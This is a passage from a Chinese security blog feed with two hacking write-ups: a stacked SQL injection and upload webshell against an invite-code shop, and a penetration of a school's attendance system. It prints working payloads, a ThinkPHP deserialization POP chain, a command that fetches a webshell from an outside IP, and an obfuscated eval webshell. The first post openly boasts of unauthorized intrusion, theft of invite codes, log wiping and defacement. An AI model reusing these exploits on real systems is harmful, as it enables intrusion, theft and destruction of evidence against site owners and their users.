从审计思路到PDO导致的前台XFF堆叠注入</h4><p>就我个人而言，拿到一套源码，我更喜欢黑白盒相结合；根据前台能访问到的功能点来确定自己审计的目标</p><p>简单看了一下整套系统是MVC架构的，使用了PDO，使用有部分过滤规则；后台默认路径是&#x2F;admin</p><p>看了一遍前台的功能点，发现在查询订单处路径名很有趣，带有一个&#x2F;query，直接搜一下页面上关键词，跟进入到源码中</p><p><img src="https://i.loli.net/2021/05/26/bhl1B4yESK9C6d8.png" alt="image-20210526024734021"></p><p>发现了如下的一段code</p><p><img src="https://i.loli.net/2021/05/26/sgoDva5h4QYZIGw.png" alt="image-20210526025356848"></p><p>PDO均为默认配置，立马想到了堆叠注入</p><p>经测试orderid用户可控，全局搜索orderid发现，orderid经函数方法后被处理为纯字符串，没有注入余地，故选择另辟蹊径</p><p>后发现ip参数用户同样可控，在调用select方法前没做任何处理。</p><p>ip参数调用的是getClientIP方法，我们跟一下getClientIP方法</p><p><img src="https://i.loli.net/2021/05/26/hng6kUiuVRmO4aQ.png" alt="image-20210526030817917"></p><p>很好理解，就是从常见的http header中获取客户端IP</p><p>但是非常高兴，ip参数未做任何处理，我们可以通过构造XFF头来实现堆叠注入</p><p>因为有csrf_token的校验，我们必须在查询订单的页面，随便输入个订单号，随后输入正确的验证码，随后查询才有效</p><p>随后手动构造XFF头，进行针对PDO的堆叠注入</p><p>因为PDO处为双引号进行语句闭合，且属于无回显的堆叠注入</p><p>故构造Payload为</p><pre><code class="php">X-FORWARDED-For:1&#39;;select sleep(5)#</code></pre><p><img src="https://i.loli.net/2021/05/26/h6Tv1eJEpzQZcKg.png" alt="image-20210526202008945"></p><p>延迟了5s，注入成功。</p><p>针对这种没回显的堆叠注入，盲注太慢，用Dnslog OOB又太慢，所以选择构造一个添加后台管理员的insert payload</p><pre><code class="php">X-FORWARDED-For:1“;insert into t_admin_user values(99,&quot;test@test.test&quot;,&quot;76b1807fc1c914f15588520b0833fbc3&quot;,&quot;78e055&quot;,0);</code></pre><p>但是现实是很残酷的，测试发现，在XFF头中，1”将语句闭合后只要出现了引号或者逗号，就会引发报错，SQL语句无法执行</p><p>但是具有一定审计经验的兄弟一定会想到，PDO下Prepare Statement给我们提供了绕过过滤进行注入的沃土</p><p>山重水复疑无路，柳暗花明又一村</p><h4 id="5-3-Prepare-Statement构造注入语句"><a href="#5-3-Prepare-Statement构造注入语句" class="headerlink" title="5.3 Prepare Statement构造注入语句"></a>5.3 Prepare Statement构造注入语句</h4><p><strong>知识补充 — Prepare Statement写法</strong></p><p>MySQL官方将prepare、execute、deallocate统称为PREPARE STATEMENT(预处理)</p><p>预制语句的SQL语法基于三个SQL语句：</p><pre><code class="sql">prepare stmt_name from preparable_stmt;execute stmt_name [using @var_name [, @var_name] ...];&#123;deallocate | drop&#125; prepare stmt_name;</code></pre><p>给出MYSQL中两个简单的demo</p><pre><code class="php">set@a=&quot;select user()&quot;;PREPARE a FROM @a;execute a;select sleep(3);#set@a=0x73656C65637420757365722829;PREPARE a FROM @a;execute a;select sleep(3);#  //73656C65637420757365722829为select user() 16进制编码后的字符串，前面再加上0x声明这是一个16进制字符串</code></pre><p>Prepare语句在防范SQL注入方面起到了非常大的作用，但是对于SQL注入攻击却也提供了新的手段。</p><p>Prepare语句最大的特点就是它可以将16进制串转为语句字符串并执行。如果我们发现了一个存在堆叠注入的场景，但过滤非常严格，便可以使用prepare语句进行绕过。</p><p>将我们的insert语句直接hex编码</p><p><img src="https://i.loli.net/2021/05/26/ZcOIGsY7y4LeT2w.png" alt="image-20210526200448332"></p><p>构造注入语句</p><pre><code class="php">X-FORWARDED-For:1&quot;;set@a=0x696E7365727420696E746F20745F61646D696E5F757365722076616C7565732839392C227465737440746573742E74657374222C223736623138303766633163393134663135353838353230623038333366626333222C22373865303535222C30293B;PREPARE a FROM @a;execute a;select sleep(3);#//sleep用于判断注入是否成功</code></pre><p><img src="https://i.loli.net/2021/05/26/PIcbgu84aAz1OQt.png" alt="image-20210526201816276"></p><p>延时3s，注入成功，成功添加了一个账号为<a href="mailto:&#x74;&#x65;&#115;&#116;&#64;&#x74;&#x65;&#x73;&#x74;&#46;&#x74;&#101;&#115;&#116;">&#x74;&#x65;&#115;&#116;&#64;&#x74;&#x65;&#x73;&#x74;&#46;&#x74;&#101;&#115;&#116;</a>，密码为123456的后台管理员</p><p>直接默认后台路径&#x2F;admin登录后台</p><p><img src="https://i.loli.net/2021/05/26/e2Q5VTXWOKxEYpM.png" alt="image-20210526202209072"></p><p>前台提交一个cl社区邀请码的订单</p><p>后台修改订单状态为确认付款</p><p><img src="https://i.loli.net/2021/05/26/hqzsVuaZxb2AnOW.png" alt="image-20210526202525849"></p><p>没过一会，邀请码直接到邮箱</p><p><img src="https://i.loli.net/2021/05/26/tY5ZA1vmCTyjDMs.png" alt="image-20210526202705629"></p><p>以后可以搜片看了</p><p><img src="https://i.loli.net/2021/05/26/zMArkUQ8eyBa3C9.png" alt="image-20210526202913110"></p><p><img src="https://i.loli.net/2021/05/26/Idr6JSnjLpb5zuF.jpg" alt="ä¿å­ä¿å­å¨é¨ä¿å­ï¼ç»§ç»­ååï¼"></p><h4 id="5-4-不讲武德被发现"><a href="#5-4-不讲武德被发现" class="headerlink" title="5.4 不讲武德被发现"></a>5.4 不讲武德被发现</h4><p>在不讲武德，连续薅了几个邀请码，发给朋友后</p><p>站长终于发现了</p><p><img src="https://i.loli.net/2021/05/26/Rf3U9MGvTdsz86S.png" alt="image-20210526203058983"></p><p>八嘎，既然发现了，那就干脆把你的站日下来吧，然后好好擦擦屁股，免得0day被这站长抓走</p><p><img src="https://i.loli.net/2021/05/26/TPcSE51ULyY8rBF.jpg" alt="çå°´å°¬å"></p><h4 id="5-5-后台Getshell审计-Thanks-17-M78sec"><a href="#5-5-后台Getshell审计-Thanks-17-M78sec" class="headerlink" title="5.5 后台Getshell审计(Thanks 17@M78sec)"></a>5.5 后台Getshell审计(Thanks 17@M78sec)</h4><p>经测试后台的文件上传处鉴权比较严格，没法直接前台getshell</p><p>但是后台文件上传处，没有对文件扩展名进行任何过滤，只有一处前端js校验，所以后台getshell直接白给</p><p><img src="https://i.loli.net/2021/05/26/SjJafoTI2K6N3lA.png" alt="image-20210526205833957"></p><p>文件上传后不会返回上传路径，但上传路径和上传文件的命名规则我们已经了如指掌</p><p><img src="https://i.loli.net/2021/05/26/IGrMv2QtBoK31Ey.png" alt="image-20210526204139761"></p><p>UPLOAD_PATH定义如下</p><pre><code>define(&#39;UPLOAD_PATH&#39;, APP_PATH.&#39;/public/res/upload/&#39;);</code></pre><p>CUR_DATE定义如下</p><pre><code>define(&#39;CUR_DATE&#39;, date(&#39;Y-m-d&#39;));</code></pre><p>文件名</p><pre><code>$filename=date(&quot;His&quot;);  //小时+分钟+秒</code></pre><p>以我现在21点05分钟为例，输出结果如下</p><p><img src="https://i.loli.net/2021/05/26/OYBvblwyEn8hL3J.png" alt="image-20210526210650296"></p><p>以2021年5月26日的21点05分44秒为例</p><p>完整的文件路径即为</p><pre><code>http://www.xxx.com/res/upload/2021-05-26/210444.php</code></pre><p>直接构造表单</p><pre><code>&lt;meta charset=&quot;utf-8&quot;&gt;&lt;form action=&quot;http://xxx.top/Admin/products/imgurlajax&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;File:&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;    &lt;input type=&quot;text&quot; name=&quot;pid&quot; id=&quot;pid&quot; /&gt;  &lt;--! pid记得自行修改为商品的id(后台选择商品抓包即可获取)--&gt;&lt;/--!&gt;    &lt;input type=&quot;submit&quot; value=&quot;Upload&quot; /&gt;&lt;/form&gt;</code></pre><p>同时需要添加Referer: <a href="http://xxx.top/Admin/products/imgurl/?id=1,%E5%B9%B6%E4%BF%AE%E6%94%B9%E4%B8%8B%E6%96%B9%E7%9A%84">http://xxx.top/Admin/products/imgurl/?id=1,并修改下方的</a></p><p>否则会提示“请选择商品id”</p><p>最后完整的上传http request如下</p><pre><code class="http">POST http://xxx.top/Admin/products/imgurlajax HTTP/1.1Host: xxxxContent-Length: 291Accept: application/json, text/javascript, */*; q=0.01DNT: 1X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeSrhtSPGxub0H0ebOrigin: http://47.105.132.207Referer: http://xxx.top/Admin/products/imgurl/?id=12Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: PHPSESSID=ql4ep5uk8cf9i0rvihrruuilaqConnection: close------WebKitFormBoundaryeSrhtSPGxub0H0ebContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;Content-Type: image/png&lt;?php    phpinfo();------WebKitFormBoundaryeSrhtSPGxub0H0ebContent-Disposition: form-data; name=&quot;pid&quot;12------WebKitFormBoundaryeSrhtSPGxub0H0eb--</code></pre><p>直接上传成功</p><p>随后通过burpsuite Intruder来跑一下最后的秒数</p><p>毕竟秒数不能拿捏的那么精准</p><p><img src="https://i.loli.net/2021/05/26/n8phY6lVJbKaBPd.png" alt="image-20210526212753095"></p><p><img src="https://i.loli.net/2021/05/26/VbxMQNrkJFA7mo9.png" alt="image-20210526233749316"></p><p>直接拿捏。</p><p>把web日志清理掉</p><p>然后给public index页面加点乐子</p><p><img src="https://i.loli.net/2021/05/26/OgoMxL3fnZaSDwv.png" alt="image-20210526234200023"></p><p>传统功夫，点到为止。</p><p><img src="https://i.loli.net/2021/05/26/iGZFs84qVx2SjR7.png" alt="image-20210526234615393"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>本文主要介绍了通过PDO防范SQL注入的方法和PDO中的注入利用思路，并给大家带来了一个0day实例</p><p>你会发现层层抽丝剥茧研究一个模块，并将其中的姿势应用于实战中，是一件很美妙的事情。</p><p>相信师傅们是很容易定位到出现本0day的系统的，这个0day就算白送各位师傅的了，希望师傅们也早日成为1024社区会员</p><p><img src="https://i.loli.net/2021/05/26/slFQitd5wUKnvj1.jpg" alt="img"></p><h2 id="0x07-Refence："><a href="#0x07-Refence：" class="headerlink" title="0x07 Refence："></a>0x07 Refence：</h2><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p><p><a href="https://blog.51cto.com/u_12332766/2137035">https://blog.51cto.com/u_12332766/2137035</a></p><p><a href="https://xz.aliyun.com/t/3950">https://xz.aliyun.com/t/3950</a></p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次奇妙的学校渗透之旅</title>
      <link href="/2020/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A5%87%E5%A6%99%E7%9A%84%E5%AD%A6%E6%A0%A1%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/"/>
      <url>/2020/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A5%87%E5%A6%99%E7%9A%84%E5%AD%A6%E6%A0%A1%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h3><p>由于疫情问题，学校的易班APP新增了打卡系统，每天需要进行晨检，午检打卡，忘记的话就是上千字检讨</p><p>本人对于这种“形式主义”深感不满，于是准备操作一番</p><p><img src="https://i.loli.net/2020/11/13/9tK5Iyozsp4rPq7.jpg" alt="IMG_20201030_190004"></p><p>非常幸运，校级“易班”系统的负责人就是我们团队的指导老师，</p><p>在取得他的授权后，便开始了对于易班系统的曲折而又精彩的渗透</p><p><strong>在此鸣谢M78sec的所有成员</strong></p><h3 id="0x02踩点"><a href="#0x02踩点" class="headerlink" title="0x02踩点"></a>0x02踩点</h3><p>基本的信息搜集咱们就不多说了</p><p>根据老师口述，该域名下部署有多项功能系统（包括负载均衡，直播，表白墙，打卡签到系统，心理测试系统等等），因此不同系统使用了不同的多台服务器</p><p>看样不能一劳永逸，需要各个系统、服务器逐个击破，然后摸入核心系统中</p><p>首先打开“易班”系统的首页是这个样子</p><p><img src="https://i.loli.net/2020/11/13/L9kfsIgtYWw8PdC.png" alt="image-20201113133208461"></p><p>不难看出，开发者使用了TP框架，在简单地测试了各种TP 注入，RCE的payload后均以失败告终，看样安全意识还不算太差</p><p>域名下的首页完全就是一个报错页面，没有任何功能点和信息</p><p>俗话说得好，信息搜集的好坏直接决定了我们渗透的成败，因此我们绝对不能疏忽大意。</p><p>我们先来fuzz一级目录</p><p><img src="https://i.loli.net/2020/11/13/9TvMCqsmjP8n5yK.png" alt="image-20201113134315588"></p><p>成果还不错，不少目录和功能点，随后我们继续fuzz各个一级目录的二级目录，不断摸索该域名下部署的功能点</p><p>具体的就不上图了，因为一级目录太多了。</p><p>了解清楚功能点后，直接脱裤子开干</p><h3 id="0x03-心理健康系统的渗透（IIS短文件名–-gt-老登录口–-gt-爆破–-gt-新登录口–-gt-上传）"><a href="#0x03-心理健康系统的渗透（IIS短文件名–-gt-老登录口–-gt-爆破–-gt-新登录口–-gt-上传）" class="headerlink" title="0x03 心理健康系统的渗透（IIS短文件名–&gt;老登录口–&gt;爆破–&gt;新登录口–&gt;上传）"></a>0x03 心理健康系统的渗透（IIS短文件名–&gt;老登录口–&gt;爆破–&gt;新登录口–&gt;上传）</h3><p>通过一级目录爆破，爆破出</p><p><a href="http://xxx.xxx.edu.cn/psy%E8%BF%99%E4%B8%AA%E8%B7%AF%E5%BE%84">http://xxx.xxx.edu.cn/psy这个路径</a></p><p>发现其中部署了心理教育健康系统，中间件为IIS</p><p>但是心理健康系统登录口有验证码机制，而且验证码不容易识别</p><p><img src="https://i.loli.net/2020/11/13/sfTZbxvCE6re7LH.png" alt="image-20201113135959569"></p><p>立马想到iis短文件名特性</p><p>随后通过iis短文件名目录扫描工具（<a href="https://github.com/lijiejie/IIS_shortname_Scanner%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F">https://github.com/lijiejie/IIS_shortname_Scanner）进行扫描</a></p><p>!(<a href="https://i.loli.net/2020/11/13/eBsFcAxPQ84OJi1.jpg">https://i.loli.net/2020/11/13/eBsFcAxPQ84OJi1.jpg</a>) </p><p>获取到老的其他系统登录口</p><p><a href="http://xxx.xxx.edu.cn/psy/Login2.aspx">http://xxx.xxx.edu.cn/psy/Login2.aspx</a></p><p><img src="https://i.loli.net/2020/11/13/rwOx7TJbjAasNU1.png" alt="image-20201113135355472"></p><p>如图，没有任何验证码机制</p><p>直接Burp Cluster bomb式爆破</p><p>成功得到其他系统的弱口令admin,Aa123456</p><p>但是老系统其他页面已经删除，无法正常登入后台</p><p><img src="https://i.loli.net/2020/11/13/6sFRtDz81TpKvVy.png" alt="image-20201113140106639"></p><p>八嘎呀路，不是良民的干活！</p><p>但推测新老系统用的同一个数据库</p><p>访问新系统</p><p><a href="http://xxx.xxx.edu.cn/psy/Login.aspx">http://xxx.xxx.edu.cn/psy/Login.aspx</a></p><p>使用密码admin,Aa123456成功登陆</p><p><img src="https://i.loli.net/2020/11/13/97j31IzLdiktCEg.png" alt="image-20201113140540357"> </p><p>后台翻找上传点</p><p>上传点在</p><p><a href="http://xxx.xxx.edu.cn/psy/ScaleManage/ScaleEdit.aspx?ScaleListID=1">http://xxx.xxx.edu.cn/psy/ScaleManage/ScaleEdit.aspx?ScaleListID=1</a></p><p>量表平台这边的添加题目存在任意文件上传(话说这个上传点…可以说是相当隐蔽了..找了好久才找到)</p><p><img src="https://i.loli.net/2020/11/13/qYmMlw6O5EaHkds.png" alt="image-20201113140741415"> </p><p>上传aspx会莫名其妙跳转，asp不解析，直接传了个asmx的马</p><p>通过awvs 10的调试模块执行命令</p><p><img src="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221210801913-1610515774.png" alt="image"></p><p>权限为net service</p><p>使用cobaltstrike直接powershell一句话上权限</p><p><img src="https://i.loli.net/2020/11/13/JhNuE2WT1ItbUco.png" alt="image-20201113141153516"></p><p>结果补丁貌似比较死。。</p><p>各种本地提权Exp上了一遍，没什么逼用</p><p>Com组件，土豆上了也提不下来，先这样吧，提权要是提下来了再补充</p><p>心理健康系统宣布初步拿下</p><h3 id="0x04-直播系统接口注入"><a href="#0x04-直播系统接口注入" class="headerlink" title="0x04 直播系统接口注入"></a>0x04 直播系统接口注入</h3><p>在进入直播系统后，发现没什么可以利用的点，大概开发还没有完成</p><p><a href="https://imgchr.com/i/DpP1rn"><img src="https://s3.ax1x.com/2020/11/13/DpP1rn.png" alt="DpP1rn.png"></a></p><p>但是在BURP中，我发现了一个ajax接口的请求,下体一硬</p><p><img src="https://i.loli.net/2020/11/13/LMeBq46tPazNXKo.png" alt="image-20201113142150278"></p><p>http请求如下</p><pre><code>POST /index.php/Live/index/seat_ajax.html HTTP/1.1Host: xxx.xxx.edu.cnContent-Length: 24Accept: */*Origin: http://xxx.xxx.edu.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; 1501_M02 Build/LMY47D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.818 U3/0.8.0 Mobile Safari/534.30Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://xxx.xxx.edu.cn/index.php/Live/index/seat?place_id=10&amp;active_id=20Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: ASP.NET_SessionId=s0clwrginz0rw3x0smtwtsgg; PHPSESSID=7985bf0a5f38e5922a651ac1f4ef9b1a; PHPSESSID=7985bf0a5f38e5922a651ac1f4ef9b1aConnection: close place_id=10&amp;active_id=20</code></pre><p> <img src="https://i.loli.net/2020/11/13/eI6CjpW8L5BRYwN.png" alt="image-20201113141807391"></p><p>进行fuzz找到SQLI Payload</p><p><img src="https://i.loli.net/2020/11/14/RSwQrOYcgzAtW4V.png" alt="image-20201114103336060"></p><p>两个id参数都存在union注入</p><p><a href="https://imgchr.com/i/DpuwbF"><img src="https://s3.ax1x.com/2020/11/13/DpuwbF.png" alt="DpuwbF.png"></a></p><p>构造payload</p><p><code>) UNION ALL SELECT NULL,NULL,NULL,NULL,user(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Neqy</code></p><p>如图成功获得current_user信息</p><p><a href="mailto:\">“_root@10.40.0.22</a></p><p>构造payload</p><p><code>place_id=10) UNION ALL SELECT NULL,NULL,NULL,NULL,group_concat(SCHEMA_NAME),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.schemata-- Neqy&amp;active_id=20&amp;active_id=20</code></p><p> <img src="https://i.loli.net/2020/11/13/PDj1oTOUBwv9zQc.png" alt="image-20201113142647096"></p><p>其他的表、列、数据、在此就不演示了，写语句就ok，都非常简单</p><p>SQLMAP自动化演示如图</p><p><img src="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221211028612-464219720.png" alt="image"></p><p>后面发现涉及了很多其他系统的库，但并没有摸到我最想要的核心系统的库，因此渗透还得继续</p><h3 id="0X05-一个平淡无奇的B64上传"><a href="#0X05-一个平淡无奇的B64上传" class="headerlink" title="0X05 一个平淡无奇的B64上传"></a>0X05 一个平淡无奇的B64上传</h3><p>FUZZ功能点后，找到了一个未授权可以上传图片的地方</p><p><a href="http://xxx.xxx.edu.cn/v4/public/weui/demo/form12.html">http://xxx.xxx.edu.cn/v4/public/weui/demo/form12.html</a></p><p><a href="https://imgchr.com/i/DpAWkt"><img src="https://s3.ax1x.com/2020/11/13/DpAWkt.png" alt="DpAWkt.png"></a></p><p><a href="https://imgchr.com/i/DpKYIH"><img src="https://s3.ax1x.com/2020/11/13/DpKYIH.png" alt="DpKYIH.png"></a></p><p>发现data:image&#x2F;jpeg时上传jpeg图片</p><p>直接改data改为image&#x2F;php,然后将上传内容base64编码后提交</p><p><img src="https://i.loli.net/2020/11/13/CHZ1PhFIdBJEwo2.png" alt="image-20201113144832373"></p><p>Getshell成功，SYSTEM权限，提权都省了</p><p>!(<a href="https://i.loli.net/2020/11/13/cRyQC3XMA2duFG8.jpg">https://i.loli.net/2020/11/13/cRyQC3XMA2duFG8.jpg</a>)</p><h3 id="0X06-核心系统精彩渗透（Nday反序列化-命令执行绕过-条件竞争Getshell）"><a href="#0X06-核心系统精彩渗透（Nday反序列化-命令执行绕过-条件竞争Getshell）" class="headerlink" title="0X06 核心系统精彩渗透（Nday反序列化+命令执行绕过+条件竞争Getshell）"></a>0X06 核心系统精彩渗透（Nday反序列化+命令执行绕过+条件竞争Getshell）</h3><p>寻寻觅觅，冷冷清清，凄凄惨惨凄凄，终于找到了我们的控制“易班”核心系统</p><p><a href="http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree">http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree</a></p><p><img src="https://i.loli.net/2020/11/13/isfrbkZp7SVD6X8.png" alt="image-20201113145542691"></p><p>胜利就在眼前…不睡觉也要把他给搞下来</p><p>各种fuzz，各种操作一块安排上去，发现并没有什么卵用，依旧日不进去</p><p>难道就此放弃？？不可能，这不是我们的风格</p><p>我在仔细查看页面JS的时候，发现了这样一个有趣的信息</p><p><img src="https://i.loli.net/2020/11/13/1vFsBm49guR3VaU.png" alt="image-20201113145944166"></p><p>眼前一亮，妈的ThinkAdmin，正好之前收藏了个反序列化的Nday，安排上！</p><p><img src="https://i.loli.net/2020/11/13/yJ89hnIeBSXvOos.jpg" alt="image-20201113145944166"></p><p><a href="http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree">http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree</a></p><pre><code>PostData：rules=a%3A2%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A7%3A%22%00%2A%00name%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A9%3A%22%00%2A%00hidden%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A3%3A%22123%22%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A9%3A%22%00%2A%00hidden%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A3%3A%22123%22%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7D%7Di%3A1%3Bi%3A123%3B%7D   //执行whoami</code></pre><p><img src="https://i.loli.net/2020/11/13/7MoP6fIlt9Oe1RU.png" alt="image-20201113150348311"></p><p>下面为反序列化pop链子如下</p><pre><code class="php">&lt;?phpnamespace think;use think\model\Pivot;abstract class Model&#123;  private $lazySave = false;   # save()  private $exists = false;   # updateData()  protected $connection;  protected $name;       # __toString() Conversion.php =&gt;Pivot  private $withAttr = [];     # assert  protected $hidden = [];  private $data = [];  protected $withEvent = false;  private $force = false;  protected $field = [];  protected $schema = [];   function __construct()&#123;    $this-&gt;lazySave = true;    $this-&gt;exists = true;    $this-&gt;withEvent = false;    $this-&gt;force = true;    $this-&gt;connection = &quot;mysql&quot;;    $this-&gt;withAttr = [&quot;test&quot;=&gt;&quot;system&quot;];    $this-&gt;data = [&quot;test&quot;=&gt;&quot;whoami&quot;];    $this-&gt;hidden = [&quot;test&quot;=&gt;&quot;123&quot;];     $this-&gt;field = [];    $this-&gt;schema = [];  &#125;&#125;namespace think\model;use think\Model;\# Model 是一个抽象类，我们找到它的继承类，此处选取的是 Pivot 类class Pivot extends Model&#123;  function __construct($obj=&quot;&quot;)&#123;    parent::__construct();    $this-&gt;name = $obj;     # $this-&gt;name放子类构造方法中赋值，直接放基类属性中初始化不成功  &#125;&#125;$a=new Pivot();echo urlencode(serialize([new Pivot($a),123]));?&gt;</code></pre><p> <img src="https://i.loli.net/2020/11/13/7MoP6fIlt9Oe1RU.png" alt="image-20201113150348311"></p><p>权限为system，哈哈哈哈哈哈，天助我也</p><p>但使用echo命令写shell过程中遇到了很多问题</p><p>①命令不能带空格，而且&lt;&gt;直接在一条命令中出现写shell，否则会报错</p><p>②空格会被转换为+ 而+ 他后端又识别不了</p><p> <img src="https://i.loli.net/2020/11/13/JftkQsum25TDFrb.jpg" alt="image-20201113150348311"> </p><p>经过坚持不懈的手动测试，发现&#x2F;\可以绕过空格的限制</p><p>然后再使用&amp;&amp;来拼接命令，实现对于写入&lt;&gt;检测的绕过</p><p>但是目标机有waf，普通的webshell传上去过几秒就会被杀</p><p>何妨，直接通过条件竞争远程下载免杀的webshell</p><p><strong>构造命令通过条件竞争下载免杀shell</strong></p><p><code>echo/^&lt;^?php&gt;&gt;s1.php&amp;&amp;echo/file_put_contents(&#39;s2.php&#39;,file_get_contents(&#39;http://49.x.x.x:8080/shell.txt&#39;));?^&gt;&gt;&gt;s2.php</code></p><p>免杀shell内容如下</p><pre><code>&lt;?phpfunction test($php_c0d3)&#123;  $password=&#39;skr&#39;;//EnvPwd  $cr=preg_filter(&#39;/\s+/&#39;,&#39;&#39;,&#39;c h r&#39;);  $bs64=preg_filter(&#39;/\s+/&#39;,&#39;&#39;,&#39;bas e64 _de cod e&#39;);  $gzi=$cr(103).$cr(122).$cr(105).$cr(110);  $gzi.=$cr(102).$cr(108).$cr(97).$cr(116).$cr(101);  $c=$bs64($php_c0d3);  $c=$gzi($c);  @eval($c);&#125;$php_c0d3=&#39;S0lNy8xL1VAvzkjNySlILC5W11EBUeX&#39;.&#39;5RSma1rxcKgWZeWm2KvFBroGhrsEh0UogvlIsUC&#39;.&#39;YzTQMiaatUmVqspFnNy1WQARLI1wBprAXi1LLEH&#39;.&#39;A2EXrgdsZrWAA==&#39;;test($php_c0d3);?&gt;</code></pre><p>通过反序列化pop链子生成Postdata</p><p>直接打过去</p><p><a href="http://xxx.xxx.edu.cn/v4/public/s2.php">http://xxx.xxx.edu.cn/v4/public/s2.php</a></p><p>密码Skr</p><p>直接拿下</p><p><a href="https://imgchr.com/i/DpncnS"><img src="https://s3.ax1x.com/2020/11/13/DpncnS.png" alt="DpncnS.png"></a> </p><p>终于拿下了这个打卡，晚点名，考勤的核心系统，adminer进入库中解密管理员密码</p><p>妈的，还想让老子写检讨？？？吃屎去吧</p><p><img src="https://i.loli.net/2020/11/13/5JviyQlHs17LICn.png" alt="image-20201113151136404"></p><p>核心系统宣布拿下~圆满完成任务</p><h3 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h3><p>本次渗透虽然没什么太骚的操作，但是很多地方都是经验使然</p><p>同时非常感谢M78sec朋友们的协助</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BS架构在线Shellcode免杀平台</title>
      <link href="/2020/08/25/BS%E6%9E%B6%E6%9E%84%E5%9C%A8%E7%BA%BFShellcode%E5%85%8D%E6%9D%80%E5%B9%B3%E5%8F%B0/"/>
      <url>/2020/08/25/BS%E6%9E%B6%E6%9E%84%E5%9C%A8%E7%BA%BFShellcode%E5%85%8D%E6%9D%80%E5%B9%B3%E5%8F%B0/</url>
      
